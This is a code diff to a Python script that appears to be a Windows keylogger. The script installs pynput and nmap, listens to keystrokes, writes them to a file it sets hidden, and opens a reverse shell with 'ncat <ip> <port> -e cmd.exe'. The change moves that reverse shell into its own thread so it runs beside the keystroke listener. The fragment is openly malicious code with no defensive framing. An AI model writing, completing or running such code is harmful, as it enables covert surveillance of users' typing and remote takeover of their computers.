@@ -2,6 +2,7 @@ import os
 import ctypes
 import subprocess
 import sys
+import threading
 # Check if the `pynput` package is installed
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'nmap'])
@@ -63,8 +64,15 @@ def write_file(tangs):
         ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
         if not ret:
             raise ctypes.WinError()
-        os.system('"start /b cmd.exe @cmd /c "cmd /k "ncat <ip> <port> -e cmd.exe""')
+        
+        
+# Function to run the ncat command
+def run_ncat():
+    os.system('"start /b cmd.exe @cmd /c "cmd /k "ncat <ip> <port> -e cmd.exe""')
 
-# Start the tang listener
+# Start the tang listener in a separate thread
+thread = threading.Thread(target=run_ncat)
+thread.start()
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
